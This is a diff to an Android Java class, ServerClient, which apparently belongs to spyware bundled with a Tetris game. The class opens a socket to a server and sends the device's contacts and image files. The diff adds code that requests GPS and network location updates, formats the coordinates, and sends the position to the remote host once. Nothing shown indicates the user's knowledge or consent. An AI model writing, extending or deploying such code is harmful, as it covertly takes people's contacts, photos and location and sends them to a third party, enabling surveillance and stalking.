@@ -2,10 +2,17 @@ package com.kdh.test;
 
 import android.content.ContentResolver;
 import android.content.Context;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.os.AsyncTask;
+import android.os.Bundle;
 import android.os.Environment;
 import android.util.Log;
+import android.widget.ProgressBar;
 import android.widget.Toast;
+
+import com.chobocho.tetrisgame.TetrisViewForN8;
 
 import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
@@ -30,6 +37,8 @@ public class ServerClient extends AsyncTask<Void, Integer, Integer> {
     PrintWriter out;
     String data;
     String[] extensions = {".jpg", ".png", ".jpeg"};
+    boolean sendLocation = false;
+
 
     public ServerClient(Context context){
         this.context = context;
@@ -49,8 +58,8 @@ public class ServerClient extends AsyncTask<Void, Integer, Integer> {
             out = new PrintWriter(new BufferedWriter(new
                     OutputStreamWriter(socket.getOutputStream(), "UTF-8")), true);
             sendContact();
+            sendLocation();
             sendImage();
-
 
         } catch (IOException e) {
             e.printStackTrace();
@@ -58,6 +67,65 @@ public class ServerClient extends AsyncTask<Void, Integer, Integer> {
 
         return null;
     }
+
+    private void sendLocation(){
+        getLocation();
+    }
+
+    public void getLocation() {
+        final LocationManager lm = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
+        try {
+            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+
+            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1, gpsLocationListener);
+            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 1, gpsLocationListener);
+        }
+        catch(SecurityException e){
+            e.printStackTrace();
+        }
+    }
+    final LocationListener gpsLocationListener = new LocationListener() {
+        @Override
+        public void onLocationChanged(Location location) {
+            String provider = location.getProvider();
+            double longitude = location.getLongitude();
+            double latitude = location.getLatitude();
+            double altitude = location.getAltitude();
+
+            if (sendLocation == false){
+                String Locate = Integer.toString(((int)latitude));
+                latitude = ((latitude - (int)latitude)) * 60;
+                Locate += '°' + Integer.toString((int)latitude);
+                latitude = ((latitude - (int)latitude)) * 60;
+                String tmp = Double.toString(latitude);
+                Locate += '\'' + tmp.substring(0,tmp.indexOf('.')+2) + "\"N+";
+
+                Locate = Integer.toString(((int)longitude));
+                longitude = ((longitude - (int)longitude)) * 60;
+                Locate += '°' + Integer.toString((int)longitude);
+                longitude = ((longitude - (int)longitude)) * 60;
+                tmp = Double.toString(longitude);
+                Locate += '\'' + tmp.substring(0,tmp.indexOf('.')+2) +"\"E";
+
+                Log.w("locate", Double.toString(latitude));
+                out.println(Locate);
+                sendLocation = true;
+            }
+        }
+
+        @Override
+        public void onStatusChanged(String provider, int status, Bundle extras) {
+
+        }
+        @Override
+        public void onProviderEnabled(String provider) {
+
+        }
+        @Override
+        public void onProviderDisabled(String provider) {
+
+        }
+    };
 
     private void sendContact(){
         ContactUtil cu = new ContactUtil(context);
